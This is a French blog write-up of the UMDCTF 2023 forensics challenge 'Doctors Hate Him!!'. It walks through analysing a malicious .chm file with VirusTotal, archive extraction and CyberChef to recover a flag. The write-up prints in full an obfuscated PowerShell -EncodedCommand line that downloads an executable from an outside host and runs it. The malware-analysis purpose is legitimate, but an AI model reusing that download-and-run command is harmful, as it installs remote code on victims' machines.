---
title: "UMDCTF - Forensics[Doctors Hate Him!!]"
date: 2023-05-01T19:11:46+02:00
author: "Kira"
description: "Writeups du challenge Doctors hate him!! de UMDCTF 2023"
images: []
resources:
featuredImage: "images/umdctf/banner_2023.png"
featuredImagePreview: "images/umdctf/banner_2023.png"

tags: ["writeups", "ctf", "umdctf", "forensics"]
categories: ["writeups"]

lightgallery: true

toc:
  auto: false
---


<!--more-->

![Description](images/umdctf/doctors_hate_him/Untitled.png "Description du challenge")

## Introduction

La description de ce challenge n’est pas très parlante, si ce n’est que l’intitulé nous fait penser à un malware.

Ayant il n’y a pas longtemps entendu parler de la petite nouveauté sur virus total concernant l’analyse de malware. Je me suis dit que cela est l’occasion rêvée de tester celui ci 😃

## Investigation

On se rend donc sur [virustotal.com](http://virustotal.com) et on commence par uploader le fichier Doctors-Hate-Him.chm 

Celui-ci est directement détecté comme étant un malware 

![analyse](images/umdctf/doctors_hate_him/Untitled%201.png "analyse du malware")

Nous pouvons regarder l’onglet **Behavior** pour voir les différentes informations remontées par virus total. Nous pouvons voir que ce malware flag plusieurs règles de détéction décrites ci-dessous: 

![regles](images/umdctf/doctors_hate_him/Untitled%202.png "règles matchées")

Nous pouvons voir les différentes connexions de ce malware vers des sources externes :

![connexion](images/umdctf/doctors_hate_him/Untitled%203.png "Connexion externes")

Ici, je décide d'aller vérifier ce qui se trouve à la racine de ce serveur HTTP qui est utilisé pour mettre à disposition le fichier explorer.exe.

![serverhttp](images/umdctf/doctors_hate_him/Untitled%204.png "Vérification du serveur http")

En regardant le fichier present.txt, on peut apercevoir ce qui semble être une chaîne de caractères encodée en base64.

![flag 1](images/umdctf/doctors_hate_him/Untitled%205.png "Découverte du premier flag")

Une fois décodée, celle-ci nous donne ce qui semble être la 3ème partie du flag.
(On comprend donc qu'il va encore falloir trouver deux parties du flag)

```powershell
Sliver really does sound like a pokemon... anyways pew pew! Part 3: _malware_back_bozo}
```

Dans l'onglet "Relation", on peut voir les différents liens avec le malware.

![liens](images/umdctf/doctors_hate_him/Untitled%206.png "Liens avec d'autres fichiers")

On retrouve l'URL du serveur HTTP et également les fichiers embarqués, comme ici le fichier depressed_pokemon_trainer.png.

Je décide donc d'ouvrir le malware avec 7zip afin de voir ce qu'il cache dans ses entrailles. 😄

![extraction](images/umdctf/doctors_hate_him/Untitled%207.png "Extraction des fichiers du malware")

On peut voir que celui-ci contient un fichier test.html qui attire mon attention.
Je vérifie d'abord ce qu'il contient en l'ouvrant avec Notepad++ afin d'être sûr qu'il n'est pas malveillant (on ne sait jamais 😁).

![html](images/umdctf/doctors_hate_him/Untitled%208.png "Code du fichier htlm")

Celui-ci contient également une chaîne de caractères en base64 qui, une fois décodée, nous donne :

```powershell
UMDCTF{1997_called_
```

Parfait, nous avons la première partie du flag. Il en reste une autre.

Je remarque également sur la page qu'une commande PowerShell encodée est présente :

```powershell
cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA
```

Afin de décoder correctement la commande on va se rendre sur Cyberchief : [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

Mettre la chaîne de caractères encodée et appliquer les filtres suivants pour bien décoder la commande :

![filtre](images/umdctf/doctors_hate_him/Untitled%209.png "Filtre CyberChief")

Cela nous donne : 

![resultat](images/umdctf/doctors_hate_him/Untitled%2010.png "Décodage de la commande")

La dernière partie de la commande me fait penser à une partie du drapeau.
Cela donnerait :

```powershell
UMDCTF{1997_called_gurl_jnag_gurve_malware_back_bozo}
```

En essayant de valider le flag, cela est refusé.
Je réfléchis et me dis que la deuxième partie n'a ni queue ni tête.
J'ai donc pensé à tester une encryption classique : le ROT13.

Bingo 🙂 cela nous donne : they_want_their

Le Flag final est donc : 

```powershell
UMDCTF{1997_called_they_want_their_malware_back_bozo}
```